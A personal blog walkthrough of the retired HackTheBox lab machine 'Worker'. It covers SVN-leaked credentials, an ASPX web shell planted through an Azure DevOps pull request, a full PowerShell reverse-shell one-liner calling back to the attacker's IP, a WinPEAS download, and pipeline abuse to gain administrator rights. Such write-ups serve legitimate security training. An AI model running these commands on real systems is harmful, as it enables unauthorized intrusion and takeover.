---
layout: walkthrough
title: HackTheBox - Worker
date: 2021-01-31 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/worker.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Worker --`10.10.10.203`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Worker$ nmap -sV -sC 10.10.10.203
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-26 03:30 EST
Nmap scan report for 10.10.10.203
Host is up (0.19s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  " Subversion
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.67 seconds
```

</details>

From the output shown above, we can see that the machine is a Windows machine based on the information provided from the `http-server-header`, and I added `worker.htb` to the `/etc/hosts` file. As this is a Windows machine and it only has 2 open ports, I started by looking at the web application. When browsing to <http://worker.htb:> I was presented with the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/img1.png"  style="width: 60%" />
</p>

### Subversion Enumeration
Since it looked like a default IIS page, I decided to have a look at Subversion instead. [Apache Subversion](https://subversion.apache.org/) is a software versioning and revision control system similar to Git. It can be used to maintain current and historical versions of files such as source code, web pages, and documentation. In order to interact with svn, I started out with the `help` command:

<details>

```bat

vagrant@ko:~/Desktop/HackTheBox/Worker$ svn help
usage: svn <subcommand> [options] [args]
Subversion command-line client.
Type 'svn help <subcommand>' for help on a specific subcommand.
Type 'svn --version' to see the program version and RA modules,
     'svn --version --verbose' to see dependency versions as well,
     'svn --version --quiet' to see just the version number.

Most subcommands take file and/or directory arguments, recursing
on the directories.  If no arguments are supplied to such a
command, it recurses on the current directory (inclusive) by default.

Available subcommands:
   add
   auth
   blame (praise, annotate, ann)
   cat
   changelist (cl)
   checkout (co)
   cleanup
   commit (ci)
   copy (cp)
   delete (del, remove, rm)
   diff (di)
   export
   help (?, h)
   import
   info
   list (ls)
   lock
   log
   merge
   mergeinfo
   mkdir
   move (mv, rename, ren)
   patch
   propdel (pdel, pd)
   propedit (pedit, pe)
   propget (pget, pg)
   proplist (plist, pl)
   propset (pset, ps)
   relocate
   resolve
   resolved
   revert
   status (stat, st)
   switch (sw)
   unlock
   update (up)
   upgrade
```

</details>

As shown above, there are a number of options available with svn. I began by enumerating information related to the machine through the use of the `info` command:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Worker$ svn info svn://worker.htb
Path: .
URL: svn://worker.htb
Relative URL: ^/
Repository Root: svn://worker.htb
Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: 5
Node Kind: directory
Last Changed Author: nathen
Last Changed Rev: 5
Last Changed Date: 2020-06-20 09:52:00 -0400 (Sat, 20 Jun 2020)
```

</details>

From the output above, I now had a username: `nathen` and I could see that there were 5 revisions for `worker.htb`. With svn, I was able to check out each revision to determine changes in files, similar to Git. In order to determine the different files available during each revision, I checked out each revision individually:


<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Worker$  svn checkout -r 1 svn://worker.htb
Skipped 'dimension.worker.htb' -- An obstructing working copy was found
Checked out revision 1.

vagrant@ko:~/Desktop/HackTheBox/Worker$  svn checkout -r 2 svn://worker.htb
A    deploy.ps1
Skipped 'dimension.worker.htb' -- An obstructing working copy was found
Checked out revision 2.

vagrant@ko:~/Desktop/HackTheBox/Worker$  svn checkout -r 3 svn://worker.htb
U    deploy.ps1
Skipped 'dimension.worker.htb' -- An obstructing working copy was found
Checked out revision 3.

vagrant@ko:~/Desktop/HackTheBox/Worker$  svn checkout -r 4 svn://worker.htb
D    deploy.ps1
Skipped 'dimension.worker.htb' -- An obstructing working copy was found
Checked out revision 4.

vagrant@ko:~/Desktop/HackTheBox/Worker$  svn checkout -r 5 svn://worker.htb
Skipped 'dimension.worker.htb' -- An obstructing working copy was found
A    moved.txt
Checked out revision 5.

```

</details>

The first revision appeared to be the creation of the svn repository, but revision's 2 & 3 both contained a different version of `deploy.ps1`. Additionally, the revisions provided me with a subdomain -- `dimension.worker.htb` which I added to the `/etc/hosts` file. Looking into both revisions provided me the following information:

<details>

Revision 2:
```bat

$user = "nathen"
$plain = "wendel98"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

Revision 3:
```bat
$user = "nathen"
# NOTE: We cant have my password here!!!
$plain = ""
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

</details>

As shown above, the initial commit of `deploy.ps1` contained the username, password combination for `nathen`. Even though it was removed during a later version release, svn still retained the information. Following on from this, I continued exploring the repository using the `list` command:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Worker$ svn list svn://worker.htb
dimension.worker.htb/
moved.txt

vagrant@ko:~/Desktop/HackTheBox/Worker$ svn checkout svn://worker.htb
Skipped 'dimension.worker.htb' -- An obstructing working copy was found
A    moved.txt
Checked out revision 5.
```
</details>

After identifying that the `moved.txt` file existed, I pulled a local copy of the file and extracted the contents shown below:

```text
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)
```

### Azure DevOps

After adding `devops.worker.htb` to the `/etc/hosts` file, browsing to the location presented me with a NTLM authentication prompt. After I had successfully authenticated to the application, I was presented with the Azure DevOps page:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/img2.png"  style="width: 80%" />
</p>


After some manual browsing, I came across the `spectral` branch of the repository. In order to access this subdomain, I added `spectral.worker.htb` to the `/etc/hosts` file and ensured that I could indeed access the homepage. With everything up and running, I now needed to figure out a way to exploit this. Since I had access to the Azure DevOps page and I knew about the master branch (which did not allow pushes to the main branch), I needed to create a pull request.

In order to accomplish this, I created a new branch which I would have control over:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/img3.png"  style="width: 60%" />
</p>

With the new branch now accessible, I uploaded an aspx web shell (since it's a Windows machine) to new branch, the web shell I used was located at the following location on Kali:

```bat
cp /usr/share/webshells/aspx/cmdasp.aspx hotshoto.aspx
```

Once the file was uploaded to the server, I was able to create a pull request for the master branch. 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/img4.png"  style="width: 100%" />
</p>

The final step in this process, in order to complete the pull request, was to create a Work Item. I used the following link: <http://devops.worker.htb/ekenas/SmartHotel360/_workitems/create/Feature> which allowed me to create my own work item as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/img5.png"  style="width: 100%" />
</p>

With everything created, I linked the work item to the pull request and approved my malicious request:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/img6.png"  style="width: 100%" />
</p>

In order to access the web shell, I browsed to <http://spectral.worker.htb/hotshoto.aspx> and was presented with the aspx webpage that I uploaded:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/img7.png"  style="width: 80%" />
</p>

In the meantime, I started a netcat listener on my local Kali machine and I used the payload available from the following link: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell> in order to create the reverse shell. The payload is provided below:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.21',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


## Lateral Movement using IIS AppPool

Now that I had access to the host, I ran some basic enumeration in order to determine the rights that the current `AppPool` user had. The output of which is provided below:

<details>

```bat

PS C:\> hostname
Worker
PS C:\> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Worker
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-57-E5
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::fc6e:875b:852d:36b(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::fc6e:875b:852d:36b%4(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.203(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:30b0%4
                                       10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 117461078
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-AC-4B-C4-00-50-56-B9-89-30
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

PS C:\> whoami /all

USER INFORMATION
----------------

User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

</details>

It didn't appear that the user had any interesting attributes associated with the account. I uploaded WinPEAS to the server to automate some of the enumeration using the following command:

```powershell
powershell.exe Invoke-Webrequest  -OutFile C:\\Windows\\Temp\\winPEAS.exe -Uri  http://10.10.14.21/winPEAS.exe

```

After reviewing the output, I came across the following:

<details>

```bat
Running WinPEAS:

  [+] AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!
    whitelistpaths:     W:\
    C:\Program Files\Azure DevOps Server 2019\
    C:\Program Files\Microsoft SQL Server\
    C:\Windows\System32\inetsrv\
    C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Temp
    C:\Windows\TEMP

  [+] Drives Information
   [?] Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 9 GB)(Permissions: Users [AppendData/CreateDirectories])
    W:\ (Type: Fixed)(Volume label: Work)(Filesystem: NTFS)(Available space: 17 GB)(Permissions: Users [AppendData
/CreateDirectories])

  [+] Network Shares                                                                                              
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)                                                                                                
    IPC$ (Path: )         
    W$ (Path: W:\)                

```

</details>

In addition to the normal `C$` drive, there was a `W$` drive. This drive contained additional directories related to the Azure DevOps site and svn:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/img8.png"  style="width: 60%" />
</p>

Subversion puts all the credentials in a file called `passwd`, and luckily the file was not encrypted on the host. The contents of the file are shown below:

<details>

```bat
W:\svnrepos\www\conf

PS W:\svnrepos\www\conf> type passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
```

</details>

The file contained several username, password combinations. I used CrackMapExec with the combinations and found that `robisl:wolves11` was the only valid set of credentials for the host. 

## Privilege Escalation using Robisl

Using this username, password combination, I authenticated to the host using `Evil-WinRM`:

<details>

```bat
*Evil-WinRM* PS C:\Users\robisl\Desktop> net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-04-05 20:27:26
Password expires             Never
Password changeable          2020-04-05 20:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2020-11-26 15:30:08

Logon hours allowed          All

Local Group Memberships      *Production           *Remote Management Use
Global Group memberships     *None
The command completed successfully.
```

</details>

Enumerating the host did not provide more information, so I attempted to log in to the DevOps portal using the new credentials:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/img9.png"  style="width: 80%" />
</p>

As shown above, I now had access to a new project: <http://devops.worker.htb/ekenas/PartsUnlimited/>. I decided to create a new pipeline and grant the `Robisl` user administrative permissions over the host using the following starter pipeline:

<details>

```bat
# Starter pipeline
# Start with a minimal pipeline that you can customize to build and deploy your code.
# Add steps that build, run tests, deploy, and more:
# https://aka.ms/yaml

trigger:
- master

steps:
- script: net localuser administrators robisl /add
  displayName: 'Run a one-line script'

- script: |
    echo Add other tasks to build, test, and deploy your project.
    echo See https://aka.ms/yaml
  displayName: 'Run a multi-line script'

```

</details>

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/img10.png"  style="width: 100%" />
</p>

Once the pipeline had built successfully, I went back to the `Evil-WinRM` session and reviewed my permissions. As shown below, the user was now part of the local administrators group:

<details>

```bat

*Evil-WinRM* PS C:\Users\robisl\Desktop> net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-04-05 20:27:26
Password expires             Never
Password changeable          2020-04-05 20:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2020-11-26 15:40:57

Logon hours allowed          All

Local Group Memberships      *Administrators       *Production
                             *Remote Management Use
Global Group memberships     *None
The command completed successfully.

```
</details>

Unfortunately, these rights didn't allow me to read the `root.txt` file on the host. In order to retrieve the file, I used the Azure Pipeline again and changed the script to read the file by specifying the `type` command. The output of which is provided below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Worker/img11.png"  style="width: 80%" />
</p>

An alternative method to the above would be to create a reverse shell using the pipeline, however I ran out of time when attempting to exploit this machine. That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.